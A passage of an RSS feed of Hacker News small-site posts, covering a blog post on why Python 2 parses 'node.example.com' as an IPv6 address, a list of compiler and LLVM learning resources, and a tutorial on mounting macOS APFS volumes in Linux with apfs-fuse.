        </span><span>safe_host(</span><span>"fdc8:bf8b:e62c:abcd:1111:2222:3333:4444"</span><span>)
        </span><span>== </span><span>"[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]"
    </span><span>)
</span></code></pre>
<p>Thank goodness they did. The Python 2 tests failed (<a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/#drop-python2">don't look at me like
that</a> 😒).</p>
<pre><code><span>✖ </span><span>FAIL</span><span> py27 in </span><span>1</span><span>.</span><span>83</span><span> seconds
✔ </span><span>OK</span><span> py36 in </span><span>2</span><span>.</span><span>82</span><span> seconds
✔ </span><span>OK</span><span> py37 in </span><span>2</span><span>.</span><span>621</span><span> seconds
✔ </span><span>OK</span><span> py38 in </span><span>2</span><span>.</span><span>524</span><span> seconds
✔ </span><span>OK</span><span> py39 in </span><span>2</span><span>.</span><span>461</span><span> seconds
</span></code></pre>
<p>Both the hostname and IPv6 address tests failed. But <em><strong>why</strong></em> did they fail?
And why did the Python 3 tests pass? 🤔</p>
<p>We'll start with the hostname failure and try to isolate the bug.</p>
<pre><code><span>E       </span><span>AssertionError</span><span>: </span><span>assert </span><span>'[node.example.com]' </span><span>== </span><span>'node.example.com'
</span><span>E         </span><span>- </span><span>[node.example.com]
E         ? </span><span>-                -
</span><span>E         </span><span>+ </span><span>node.example.com
</span></code></pre>
<p>The failure says <code>node.example.com</code> was surrounded by brackets, but that's
only supposed to happen for IPv6 addresses! Let's crack open a Python 2
interpreter for a quick sanity check.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)</span><span>.version
</span><span>6
</span></code></pre><img src="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/confused-jeff-bridges.webp" alt="Confused Jeff Bridges">

<p>If, like Jeff Bridges, you were confused by that result, <em>relax</em>. We're
probably not in a <a href="https://en.wikipedia.org/wiki/Bizarro_World">Bizarro World</a> where <code>node.example.com</code> is a valid IPv6
address. There must be an explanation for this behavior.</p>
<p>Things start to become a little more clear when we see the result of the
<a href="https://github.com/python/cpython/blob/v3.9.0/Lib/ipaddress.py#L27-L54"><code>ip_address()</code></a> function for ourselves.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>At first glance that looks like madness. Python 3 behaves in an entirely
different manner.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>... 
</span><span>'node.example.com' </span><span>does </span><span>not </span><span>appear to be an IPv4 </span><span>or </span><span>IPv6 address
</span></code></pre>
<p>Python 3 knows that's not an IPv6 address, so why doesn't Python 2? The answer
is in how differently the two Python versions handle text.</p>

<p>Computers don't operate on text as humans think of it. They operate on numbers.
That's part of why we have IP addresses to begin with. In order to represent
human-readable text with computers we had to assign meaning to the numbers.
Thus, <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> was born.</p>
<p>ASCII is a <a href="https://en.wikipedia.org/wiki/Character_encoding">character encoding</a>, which means it specifies how to interpret
<a href="https://en.wikipedia.org/wiki/Byte">bytes</a> as text we understand (provided you speak English). So, when your
computer sees <code>01101110</code> in <a href="https://en.wikipedia.org/wiki/Binary_number">binary</a> (<code>110</code> in <a href="https://en.wikipedia.org/wiki/Decimal">decimal</a>) you see <code>n</code> because
that's what ASCII says it is.</p>
<p>You can see the number to text conversion in action right in the Python
interpreter.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ord</span><span>(</span><span>"n"</span><span>)
</span><span>110
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span></code></pre>
<p>In fact, it doesn't matter what numbering system you use. If you specify
binary, <a href="https://en.wikipedia.org/wiki/Octal">octal</a>, decimal, hexadecimal, whatever... If it can be understood as
the right integer it will be displayed correctly.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0b01101110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0o156</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0x6e</span><span>)
</span><span>'n'
</span></code></pre>
<p>Neat, but what does that information do for us?</p>

<p>Just for giggles, humor me and let's look at the character-number translations
for <code>node.example.com</code>. We'll leave out binary and octal, because they make
this table uglier than it already is.</p>
<table>
  <tbody><tr>
    <th>Character</th>
    <td>n</td>
    <td>o</td>
    <td>d</td>
    <td>e</td>
    <td>.</td>
    <td>e</td>
    <td>x</td>
    <td>a</td>
    <td>m</td>
    <td>p</td>
    <td>l</td>
    <td>e</td>
    <td>.</td>
    <td>c</td>
    <td>o</td>
    <td>m</td>
  </tr>
  <tr>
    <th>Decimal</th>
    <td>110</td>
    <td>111</td>
    <td>100</td>
    <td>101</td>
    <td>46</td>
    <td>101</td>
    <td>120</td>
    <td>97</td>
    <td>109</td>
    <td>112</td>
    <td>108</td>
    <td>101</td>
    <td>46</td>
    <td>99</td>
    <td>111</td>
    <td>109</td>
  </tr>
  <tr>
    <th>Hexadecimal</th>
    <td>6e</td>
    <td>6f</td>
    <td>64</td>
    <td>65</td>
    <td>2e</td>
    <td>65</td>
    <td>78</td>
    <td>61</td>
    <td>6d</td>
    <td>70</td>
    <td>6c</td>
    <td>65</td>
    <td>2e</td>
    <td>63</td>
    <td>6f</td>
    <td>6d</td>
  </tr>
</tbody></table>
<p>Hey, hold on a second... If you tilt your head sideways and squint that last
row looks kinda like an IPv6 address, doesn't it?</p>
<p>We should verify, just to be absolutely certain. You've still got that Python 2
interpreter open, right?</p>
<pre><code><span>&gt;&gt;&gt; </span><span># Convert the characters in the hostname to hexadecimal.
</span><span>&gt;&gt;&gt; </span><span>hostname </span><span>= </span><span>"node.example.com"
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>= </span><span>""</span><span>.join(</span><span>hex</span><span>(</span><span>ord</span><span>(c))[</span><span>2</span><span>:] </span><span>for </span><span>c </span><span>in </span><span>hostname)
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal
</span><span>'6e6f64652e6578616d706c652e636f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Convert the "IP address" to text.
</span><span>&gt;&gt;&gt; </span><span>address </span><span>= </span><span>ipaddress.ip_address(hostname)
</span><span>&gt;&gt;&gt; </span><span>str</span><span>(address)
</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Remove the colons from that text.
</span><span>&gt;&gt;&gt; </span><span>address_without_colons </span><span>= </span><span>str</span><span>(address).replace(</span><span>":"</span><span>, </span><span>""</span><span>)
</span><span>&gt;&gt;&gt; </span><span>address_without_colons
</span><span>'6e6f64652e6578616d706c652e636f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Compare the results and see they're equal.
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>== </span><span>address_without_colons
</span><span>True
</span></code></pre>
<p>Sure enough, when you boil them both down to numbers they're the same mess of
hexadecimal.</p>

<p>If we dig into the source code for the Python 2 version of the
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py"><code>ipaddress</code></a> module we ultimately come to a
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py#L2026-L2031">curious set of lines</a>.</p>
<pre><code><span># Constructing from a packed address
</span><span>if </span><span>isinstance</span><span>(address, </span><span>bytes</span><span>)</span><span>:
    </span><span>self._check_packed_address(address, </span><span>16</span><span>)
    </span><span>bvs </span><span>= </span><span>_compat_bytes_to_byte_vals(address)
    self</span><span>._ip </span><span>= </span><span>_compat_int_from_byte_vals(bvs, </span><span>'big'</span><span>)
    </span><span>return
</span></code></pre>
<p>It turns out that, under certain conditions, the <code>ipaddress</code> module can create
IPv6 addresses from raw bytes. My assumption is that it offers this behavior as
a convenient way to parse IP addresses from data fresh off the <a href="https://en.wikipedia.org/wiki/Wire_data">wire</a>.</p>
<p>Does <code>node.example.com</code> meet those certain conditions? You bet it does. Because
we're using Python 2 it's just <code>bytes</code> and it happens to be 16 characters long.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>isinstance</span><span>(</span><span>"node.example.com"</span><span>, </span><span>bytes</span><span>)
</span><span>True
</span><span>&gt;&gt;&gt; </span><span># `self._check_packed_address` basically just checks how long it is.
</span><span>&gt;&gt;&gt; </span><span>len</span><span>(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>16
True
</span></code></pre>
<p>The rest of the <code>ipaddress</code> lines say to interpret the sequence of bytes as a
<a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a> integer. That's <a href="https://docs.python.org/3.9/library/struct.html#struct.unpack">magic</a> best left
for another blog post, but the gist is that hexadecimal interpretation of
<code>node.example.com</code> is condensed into a single, <strong>huge</strong> number.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>int</span><span>(</span><span>"6e6f64652e6578616d706c652e636f6d"</span><span>, </span><span>16</span><span>)
</span><span>146793460745001871434687145741037825901</span><span>L
</span></code></pre>
<p>That's an absolutely massive number, but not so massive it won't fit within the
<a href="https://en.wikipedia.org/wiki/IPv6#Larger_address_space">IPv6 address space</a>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ip_address(</span><span>146793460745001871434687145741037825901</span><span>L</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>As it turns out, if you're liberal in your interpretation, <code>node.example.com</code>
<em>can</em> be an IPv6 address!</p>

<p>Obviously that's hogwash. Bizarro might be proud, but that's not what we wanted
to happen.</p>
<p>There's a quote about numbers which is apocryphally attributed to <a href="https://en.wikipedia.org/wiki/W._E._B._Du_Bois">W.E.B. Du
Bois</a>, but that actually comes from <a href="https://en.wikipedia.org/wiki/Harold_Geneen">Harold Geneen</a>'s book,
<a href="https://en.wikiquote.org/wiki/Harold_Geneen"><em>Managing</em></a>.</p>
<blockquote>
<p>When you have mastered the numbers, you will in fact no longer be reading
numbers, any more than you read words when reading a book. You will be
reading meanings.</p>
</blockquote>
<p>Having not read the book I'm probably taking the quote way out of context, but
I think it fits our situation well.</p>
<p>As we've seen above, we can freely convert characters to numbers and back
again. The root of our problem is that when we use Python 2 it considers text
to be bytes. There's not a deeper, inherent meaning. Maybe the bytes are meant
to be ASCII, maybe they're meant to be a long number, maybe they're meant to be
an IP address. The interpretation of those bytes is up to us.</p>
<p>Python 2 doesn't differentiate between bytes and text by default. In fact, the
<code>bytes</code> type is just an <a href="https://docs.python.org/3/whatsnew/2.6.html#pep-3112-byte-literals">alias</a> for <code>str</code>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>bytes
</span><span>&lt;</span><span>type </span><span>'str'</span><span>&gt;
&gt;&gt;&gt; </span><span>bytes </span><span>is </span><span>str
</span><span>True
</span></code></pre>
<p>To make that even more concrete, see how Python 2 considers <code>n</code> to be the same
as this sequence of raw bytes.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>"n" </span><span>== </span><span>b</span><span>"\x6e"
</span><span>True
</span></code></pre>
<p>Our Python 2 code doesn't work the way we want it to because raw bytes can have
arbitrary meaning and we haven't told it to use our intended meaning.</p>
<p>So now we know why Python 2 interprets <code>node.example.com</code> as an IPv6 address,
but why does Python 3 behave differently? More importantly, how can we
reconcile the two?</p>

<p>ASCII looked like a good idea in the 1960's. With decades of hindsight we
know the 256 characters …</p></article></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/">https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/</a></em></p>]]>
            </description>
            <link>https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565443</guid>
            <pubDate>Tue, 29 Dec 2020 01:12:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner's Guide to Houseplants]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 39 (<a href="https://news.ycombinator.com/item?id=25565349">thread link</a>) | @Pjki889
<br/>
December 28, 2020 | https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502 | <a href="https://web.archive.org/web/*/https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565349</guid>
            <pubDate>Tue, 29 Dec 2020 00:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Resources for learning about compilers and LLVM]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25564893">thread link</a>) | @ingve
<br/>
December 28, 2020 | https://www.jessesquires.com/blog/2020/12/28/resources-for-learning-about-compilers-and-llvm/ | <a href="https://web.archive.org/web/*/https://www.jessesquires.com/blog/2020/12/28/resources-for-learning-about-compilers-and-llvm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Today I cleaned up my various projects and todo’s in <a href="https://www.omnigroup.com/omnifocus">OmniFocus</a>. I am always collecting links and resources for potential project ideas, or for general learning. Sometimes, however, it is best to acknowledge that I will likely never have enough free time to even begin some of these endeavors.</p>

<!--excerpt-->

<p>One thing I love about OmniFocus is the concept of “dropping” a project or task, which neither deletes the item nor marks it as complete — a feature sorely lacking in most “Todo” apps. Dropping an item is similar to deletion, but it preserves the record in case you would ever like to return to it. It is removed from view, but you can find it again by searching.</p>

<p>Today I decided to “drop” my compilers project in OmniFocus. I may return to it one day. Maybe not. In any case, I figured others in the community who want to learn about compilers might find these resources valuable. I have only skimmed them, but they should provide a good starting point. I hope you succeed where I did not.</p>

<p>All of these notes (among many others) are also in my <a href="https://github.com/jessesquires/TIL/blob/main/compilers/README.md">TIL repo</a> on GitHub.</p>

<ul>
  <li><a href="https://academy.realm.io/posts/tryswift-samuel-giddins-building-tiny-compiler-swift-ios/">Watch: Building a Tiny Compiler</a>, Samuel Giddins
    <blockquote>
      <p>We all use compilers every day, but they still can seem like a mysterious black box at times. In this try! Swift talk, Samuel Giddins builds a tiny compiler for his made-up language 100% from scratch to get a feel for the basics of how compilers work.</p>
    </blockquote>
  </li>
  <li><a href="https://www.skilled.io/u/playgroundscon/how-to-clang-your-dragon">Watch: How to Clang Your Dragon</a>, Harlan Haskins
    <blockquote>
      <p>We’re going to start by going over the basic structure of a compiler. Then we’re going to build a lexer and a parser for Kaleidoscope. Then we’re going to take that parse data and we’re going to compile it to LLVM Intermediate Representation.</p>
    </blockquote>
  </li>
  <li><a href="http://belkadan.com/blog/2016/05/So-You-Want-To-Be-A-Compiler-Wizard/">So You Want to Be a (Compiler) Wizard</a>, Jordan Rose
    <blockquote>
      <p>These are things you can do on your own. I’ve arranged them roughly in order of difficulty and time commitment, although of course the language / environment you pick will affect things.</p>
    </blockquote>
  </li>
  <li><a href="http://www.llvm.org/docs/tutorial/">LLVM tutorial</a>
    <blockquote>
      <p>This is the “Kaleidoscope” Language tutorial, showing how to implement a simple language using LLVM components in C++.</p>
    </blockquote>
  </li>
  <li><a href="http://www.craftinginterpreters.com/">Crafting interpreters</a>
    <blockquote>
      <p>This book contains everything you need to implement a full-featured, efficient scripting language. You’ll learn both high-level concepts around parsing and semantics and gritty details like bytecode representation and garbage collection. Your brain will light up with new ideas, and your hands will get dirty and calloused. It’s a blast.</p>
    </blockquote>
  </li>
  <li><a href="https://github.com/marciok/Mu">Mu - Swift Playground</a>
    <blockquote>
      <p>It’s a playground explaining how to create a tiny programming language (Mu).</p>
    </blockquote>
  </li>
  <li><a href="https://blog.regehr.org/archives/1453">A Tourist’s Guide to the LLVM Source Code</a>
    <blockquote>
      <p>In my Advanced Compilers course last fall we spent some time poking around in the LLVM source tree. A million lines of C++ is pretty daunting but I found this to be an interesting exercise and at least some of the students agreed, so I thought I’d try to write up something similar. We’ll be using LLVM 3.9, but the layout isn’t that different for previous (and probably subsequent) releases.</p>
    </blockquote>
  </li>
  <li>The <a href="https://www.youtube.com/c/LLVMPROJ/playlists">LLVM conference videos</a> on YouTube.</li>
</ul>

    </div></div>]]>
            </description>
            <link>https://www.jessesquires.com/blog/2020/12/28/resources-for-learning-about-compilers-and-llvm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564893</guid>
            <pubDate>Tue, 29 Dec 2020 00:00:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teaching the Unfortunate Parts]]>
            </title>
            <description>
<![CDATA[
Score 122 | Comments 90 (<a href="https://news.ycombinator.com/item?id=25564666">thread link</a>) | @gary_bernhardt
<br/>
December 28, 2020 | https://www.executeprogram.com/blog/teaching-the-unfortunate-parts | <a href="https://web.archive.org/web/*/https://www.executeprogram.com/blog/teaching-the-unfortunate-parts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.executeprogram.com/blog/teaching-the-unfortunate-parts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564666</guid>
            <pubDate>Mon, 28 Dec 2020 23:37:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to mount macOS APFS disk volumes in Linux]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25564656">thread link</a>) | @doener
<br/>
December 28, 2020 | https://linuxnewbieguide.org/how-to-mount-macos-apfs-disk-volumes-in-linux/ | <a href="https://web.archive.org/web/*/https://linuxnewbieguide.org/how-to-mount-macos-apfs-disk-volumes-in-linux/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div>
			
<div><figure><img loading="lazy" width="700" height="350" src="https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=700%2C350&amp;ssl=1" alt="" srcset="https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?w=700&amp;ssl=1 700w, https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=370%2C185&amp;ssl=1 370w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?w=700&amp;ssl=1 700w, https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=370%2C185&amp;ssl=1 370w" data-lazy-src="https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=700%2C350&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>APle FileSystem is the new filesystem for mac computers ad iOS devices since 2017.</figcaption></figure></div>



<p>In 2017, Apple changed the default filesystem on their macOS (High Sierra and above) to APFS, he Apple File System. It replaced HFS+.</p>



<p>It works on a principle of using containers, rather than partitions. It has good cloning efficiencies, better encrytion, snapshot support as well as a few other benefits. </p>




<h2><span id="Proprietary_prattle"></span>Proprietary prattle<span></span></h2>



<p>As all things recent in the Apple world, they do not like to share things. Even when this could negatively impact their business. Take FaceTime, for example. If they had made that platform agnostic, meaning that people on Windows, Android and maybe even Linux/Web platforms could use it, then it is arguable that FaceTime would have taken much of the market share from the likes of Skype. APFS is no different. Apple haven’t shared the API, so it relies on people to do an extent of guesswork, detailed research and some reverse engineering. All of which is never a good thing when you are working on the systems that look after the integrity of your files!</p>



<figure><img loading="lazy" width="807" height="234" src="https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=807%2C234&amp;ssl=1" alt="apfs documentation isn't coming any time soon." srcset="https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?w=807&amp;ssl=1 807w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=300%2C87&amp;ssl=1 300w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=768%2C223&amp;ssl=1 768w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=370%2C107&amp;ssl=1 370w" sizes="(max-width: 807px) 100vw, 807px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?w=807&amp;ssl=1 807w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=300%2C87&amp;ssl=1 300w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=768%2C223&amp;ssl=1 768w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=370%2C107&amp;ssl=1 370w" data-lazy-src="https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=807%2C234&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Apple aren’t going to be documenting or open sourcing APFS any time soon by the looks of it.</figcaption></figure>



<p>For those of you that use Linux on a mac and still have a need to access your files on the Mac partition of your hard drive on occasion then you may find it a challenge. If you have any version of macOS prior ot 10.3 (High Sierra), then your mac will be using HFS<a href="https://linuxnewbieguide.org/how-to-install-linux-on-a-macintosh-computer/">+. Check out our comprehensive guide on using Linux on a mac</a> on how to mount your HFS+ partition as read/write.<span data-ez-name="linuxnewbieguide_org-box-4"></span></p>



<h2><span id="How_do_I_get_it_working"></span>How do I get it working?<span></span></h2>



<p>For the newer APFS users, fortunately, you can now use a driver called <a href="https://github.com/sgan81/apfs-fuse">apfs-fuse </a>to access your mac’s APFS disk. Note that this driver is not part of your Linux distribution and you will have to build it from source code. This short guide will show you how. </p>



<h3><span id="Bummer,_Read_only%E2%80%A6"></span>Bummer, Read only….<span></span></h3>



<p>Unfortunately, at least for now, you are limited to read-only access. The upshot of this is that no data can be damaged by any bugs that may exist in this experimental software. The driver’s associated mount tool will also not perform transparent LZFSE decompression. I have been using this tool for a number of weeks on my ‘Mojave’ macOS computer and it works well.</p>



<h3><span id="Get_tooled_up"></span>Get tooled up<span></span></h3>



<p>Firstly, I’d like to say that this is an entirely newbie friendly tutorial, however on this occasion, it’s all work at the <a href="https://linuxnewbieguide.org/overview-of-chapters/more-advanced-guides/i-dont-know-any-commands/">Terminal</a>. Don’t worry too much if you’re not used to working at the command line, you are safe to copy and paste the instructions.</p>



<p>Firstly, we need to have the appropriate tools in order to build the APFS-Fuse driver. Open your Terminal app and enter these commands:</p>



<pre><code>sudo apt update
sudo apt install libicu-dev bzip2 cmake libz-dev libbz2-dev fuse3 libfuse3-3 libfuse3-dev clang git libattr1-dev

On older versions of Ubuntu, you may need to use the following: sudo apt install fuse libfuse-dev libicu-dev bzip2 cmake libz-dev libbz2-dev clang git libattr1-dev</code></pre>



<p>Now we can download (clone) the driver source code with git:</p>



<pre><code>git clone https://github.com/sgan81/apfs-fuse.git
cd apfs-fuse
git submodule init
git submodule update</code></pre>



<p>After that’s done, it’s time to compile the downloaded source code:</p>



<pre><code>mkdir build
cd build
cmake ..
make</code></pre>



<p>After compilation, the binaries are located in the build directory.  I recommend copying the apfs* tools into a directory that can be accessed in the path, for example /usr/local/bin. To copy them simply do this:</p>



<pre><code>sudo cp apfs-* /usr/local/bin</code></pre>



<p>Now we need to find out which disk partition macOS is on. By using the fdisk -l command you’ll be able to see the layout of the disk. </p>



<pre><code>$sudo fdisk -l
--- 8&gt;--snipped the loop volumes--&lt;8 ---
Disk /dev/sda: 465.9 GiB, 500277790720 bytes, 977105060 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 4096 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes
Disklabel type: gpt
Disk identifier: 6153AD88-FE14-4E88-8D9A-60E8AA465516

Device         Start       End   Sectors   Size Type
/dev/sda1         40    409639    409600   200M EFI System
/dev/sda2     409640 764593231 764183592 364.4G unknown
/dev/sda3  764594176 781570047  16975872   8.1G Microsoft basic data
/dev/sda4  781832192 976842751 195010560    93G Microsoft basic data
--- 8&gt;--snipped the loop volumes--&lt;8 ---</code></pre>



<p>You can see in my example above that there is a 364.4GB unknown partition. I know that this is my macOS partition because I know that the size of my macOS partition is 365GB. This means that the device identifier is /dev/sda2, so that’s what we will mount.</p>



<p>Let’s check it out and see if it works….</p>



<pre><code>sudo mkdir -p /media/$USERNAME/macos
sudo ./apfs-fuse -o allow_other /dev/sda2 /media/&lt;your userame&gt;/macos</code></pre>



<p>Hopefully, all going well, you won’t have received any error messages at this point. If you have, then perhaps the <a href="https://github.com/sgan81/apfs-fuse#apfs-fuse-driver-for-linux">README</a> file can provide some enlightenment. </p>



<div><figure><img loading="lazy" width="707" height="424" src="https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=707%2C424&amp;ssl=1" alt="" srcset="https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?w=707&amp;ssl=1 707w, https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=300%2C180&amp;ssl=1 300w, https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=370%2C222&amp;ssl=1 370w" sizes="(max-width: 707px) 100vw, 707px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?w=707&amp;ssl=1 707w, https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=300%2C180&amp;ssl=1 300w, https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=370%2C222&amp;ssl=1 370w" data-lazy-src="https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=707%2C424&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>You can see that the macos partition is now mounted in the File browser.</figcaption></figure></div>



<h3><span id="Making_it_stick"></span>Making it stick<span></span></h3>



<p><span data-ez-name="linuxnewbieguide_org-medrectangle-4"></span>If you want to have your macos partition automatically mount every time you start up you computer, then you’ll need to edit into your filesystem table (fstab). To do this, we will need to make a symlink to the apfs mount tool, and then edit the fstab (if you don’t have nano, use vim):</p>



<pre><code>sudo ln -s /usr/local/bin/apfs-fuse /usr/sbin/mount.apfs
sudo nano /etc/fstab</code></pre>



<p>Add a line at the bottom of the file (all on one line) that says this:</p>



<pre><code>mount.apfs#/dev/sda2    /media/&lt;your username&gt;/macos/    fuse    user,allow_other        0       0</code></pre>



<p>If you want to see if that works immediately just unmount the disk (see the cleaning up section below). Then type sudo mount -a to mount the disk from the fstab.</p>



<h3><span id="Getting_to_know_your_partition"></span>Getting to know your partition<span></span></h3>



<p>When the partition is mounted, you will see two directories, private-dir and root. The directory root is the one you want. Inside there is the root filesystem of your mac. You’ll find your stuff in the ‘Users’ folder.</p>



<h3><span id="Cleaning_up_(Unmounting)"></span>Cleaning up (Unmounting)<span></span></h3>



<p>To unmount the macos directory properly, you should use the fusermount command:</p>



<pre><code>fusermount -u /media/&lt;your username&gt;/macos</code></pre>



<p>I hope this has helped you get access to your mac’s files. Please share this article and let me know how you get on in the comments section below.</p>

					</div><!-- .entry-content -->
	</div></div>]]>
            </description>
            <link>https://linuxnewbieguide.org/how-to-mount-macos-apfs-disk-volumes-in-linux/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564656</guid>
            <pubDate>Mon, 28 Dec 2020 23:36:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Architecture of the Game Boy Advance]]>
            </title>
            <description>
<![CDATA[
Score 253 | Comments 80 (<a href="https://news.ycombinator.com/item?id=25564619">thread link</a>) | @biwasa
<br/>
December 28, 2020 | https://www.copetti.org/writings/consoles/game-boy-advance/ | <a href="https://web.archive.org/web/*/https://www.copetti.org/writings/consoles/game-boy-advance/">archive.org</a>
